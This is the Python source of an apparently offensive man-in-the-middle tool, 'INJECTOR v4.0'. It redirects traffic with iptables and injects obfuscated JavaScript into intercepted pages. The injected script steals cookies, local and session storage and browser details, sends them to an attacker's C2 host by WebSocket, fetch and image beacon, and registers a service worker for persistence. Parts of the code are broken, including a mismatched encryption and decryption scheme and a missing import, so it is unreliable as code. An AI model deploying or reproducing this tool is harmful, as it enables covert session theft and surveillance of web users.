#!/usr/bin/env python3
"""
INJECTOR v4.0 - Advanced HTTPS Payload Injector
MITM Proxy with SSL/TLS Interception

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only
"""

import os
import sys
import ssl
import socket
import threading
import subprocess
import json
import base64
from cryptography.fernet import Fernet
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ==================== CONFIGURATION ====================
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
C2_IP = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PAYLOAD_ENCRYPT_KEY = Fernet.generate_key()
CIPHER = Fernet(PAYLOAD_ENCRYPT_KEY)

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    """Advanced payload generator with encryption"""
    
    @staticmethod
    def generate_js_payload(c2_ip):
        """Generate encrypted JavaScript payload"""
        
        # Base payload
        payload = f"""
        (function() {{
            'use strict';
            
            // ==================== CONFIG ====================
            const C2_IP = '{c2_ip}';
            const C2_PORT = 8080;
            const WS_URL = `ws://${{C2_IP}}:${{C2_PORT}}`;
            
            // ==================== DATA COLLECTION ====================
            function collectAllData() {{
                const data = {{
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${{window.screen.width}}x${{window.screen.height}}`,
                    language: navigator.language,
                    timestamp: new Date().toISOString(),
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    memory: navigator.deviceMemory || 'unknown',
                    cores: navigator.hardwareConcurrency || 'unknown'
                }};
                return data;
            }}
            
            // ==================== EXFILTRATION ====================
            function exfiltrate(data) {{
                try {{
                    // Method 1: WebSocket
                    const ws = new WebSocket(WS_URL);
                    ws.onopen = () => {{
                        ws.send(JSON.stringify({{
                            type: 'VAULT_DUMP',
                            ip: '{c2_ip}',
                            content: data
                        }}));
                        ws.close();
                    }};
                }} catch(e) {{}}
                
                try {{
                    // Method 2: Fetch API
                    fetch(`http://${{C2_IP}}:8080/exfil`, {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(data),
                        mode: 'no-cors'
                    }});
                }} catch(e) {{}}
                
                try {{
                    // Method 3: Image beacon
                    const img = new Image();
                    img.src = `http://${{C2_IP}}:8080/collect?data=${{encodeURIComponent(JSON.stringify(data))}}`;
                }} catch(e) {{}}
            }}
            
            // ==================== PERSISTENCE ====================
            function installServiceWorker() {{
                if ('serviceWorker' in navigator) {{
                    try {{
                        navigator.serviceWorker.register('/ghost_sw.js', {{
                            scope: '/'
                        }});
                    }} catch(e) {{}}
                }}
            }}
            
            // ==================== EXECUTION ====================
            const data = collectAllData();
            exfiltrate(data);
            installServiceWorker();
        }})();
        """
        
        # Encrypt payload
        encrypted = CIPHER.encrypt(payload.encode())
        encoded = base64.b64encode(encrypted).decode()
        
        # Return self-decrypting payload
        return f"""
        <script>
        (function() {{
            const key = '{base64.b64encode(PAYLOAD_ENCRYPT_KEY).decode()}';
            const data = '{encoded}';
            
            function decrypt(encrypted, key) {{
                // Simple XOR decryption (for demo)
                let result = '';
                for (let i = 0; i < encrypted.length; i++) {{
                    result += String.fromCharCode(
                        encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length)
                    );
                }}
                return result;
            }}
            
            try {{
                const decrypted = decrypt(atob(data), atob(key));
                eval(decrypted);
            }} catch(e) {{
                console.log('Payload execution failed');
            }}
        }})();
        </script>
        """
    
    @staticmethod
    def generate_html_injection(c2_ip):
        """Generate HTML injection payload"""
        js_payload = PayloadGenerator.generate_js_payload(c2_ip)
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
        </head>
        <body>
            <div style="display:none;">
                <!-- Silent injection -->
                {js_payload}
            </div>
        </body>
        </html>
        """

# ==================== MITM PROXY ====================
class MITMProxy(BaseHTTPRequestHandler):
    """HTTPS MITM proxy for payload injection"""
    
    def do_GET(self):
        self._handle_request('GET')
    
    def do_POST(self):
        self._handle_request('POST')
    
    def do_CONNECT(self):
        """Handle HTTPS CONNECT tunnel"""
        try:
            # Parse target
            host, port = self.path.split(':')
            port = int(port)
            
            # Connect to target
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # Send connection established
            self.send_response(200, 'Connection Established')
            self.end_headers()
            
            # Upgrade to SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Wrap client socket
            client_sock = context.wrap_socket(
                self.connection,
                server_hostname=host
            )
            
            # Start tunneling
            self._tunnel(client_sock, sock)
            
        except Exception as e:
            print(f"[-] CONNECT error: {e}")
    
    def _tunnel(self, client, server):
        """Tunnel traffic between client and server"""
        try:
            # Create threads for bidirectional forwarding
            def forward(src, dst):
                while True:
                    try:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.send(data)
                    except:
                        break
            
            t1 = threading.Thread(target=forward, args=(client, server))
            t2 = threading.Thread(target=forward, args=(server, client))
            t1.daemon = True
            t2.daemon = True
            t1.start()
            t2.start()
            t1.join()
            t2.join()
        except:
            pass
        finally:
            try:
                client.close()
            except:
                pass
            try:
                server.close()
            except:
                pass
    
    def _handle_request(self, method):
        """Handle HTTP/HTTPS request"""
        try:
            # Parse request
            parsed = urlparse(self.path)
            
            # Get request data
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b''
            
            # Check if response should be modified
            if 'text/html' in self.headers.get('Content-Type', '') or \
               'text/plain' in self.headers.get('Content-Type', ''):
                # Generate payload
                payload = PayloadGenerator.generate_js_payload(C2_IP)
                
                # Create response
                response = f"""
                HTTP/1.1 200 OK
                Content-Type: text/html
                Content-Length: {len(payload)}
                
                {payload}
                """
                self.wfile.write(response.encode())
            else:
                # Forward request to target (simplified)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
                
        except Exception as e:
            print(f"[-] Request error: {e}")
            self.send_response(500)
            self.end_headers()

# ==================== MAIN ====================
def main():
    """Main entry point"""
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  INJECTOR v4.0 - HTTPS Payload Injection Engine            ║
    ║  MITM Proxy with SSL/TLS Interception                      ║
    ║                                                            ║
    ║  Target: {:<10} C2: {:<10}                    ║
    ╚═══════════════════════════════════════════════════════════════╝
    """.format(TARGET_IP, C2_IP))
    
    # Setup iptables
    os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
    os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443")
    
    # Start HTTP server
    httpd = HTTPServer(('0.0.0.0', 8080), MITMProxy)
    print("[+] HTTP MITM proxy running on port 8080")
    
    # Start HTTPS server
    httpsd = HTTPServer(('0.0.0.0', 8443), MITMProxy)
    print("[+] HTTPS MITM proxy running on port 8443")
    
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        # Run servers in threads
        t1 = threading.Thread(target=httpd.serve_forever, daemon=True)
        t2 = threading.Thread(target=httpsd.serve_forever, daemon=True)
        t1.start()
        t2.start()
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Stopping injector...")
        httpd.shutdown()
        httpsd.shutdown()
        os.system("iptables -t nat --flush")
        print("[+] Cleanup complete")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Root privileges required")
        sys.exit(1)
    
    if len(sys.argv) < 3:
        print("Usage: python3 injector_v4.py <TARGET_IP> <C2_IP>")
        sys.exit(1)
    
    TARGET_IP = sys.argv[1]
    C2_IP = sys.argv[2]
    main()
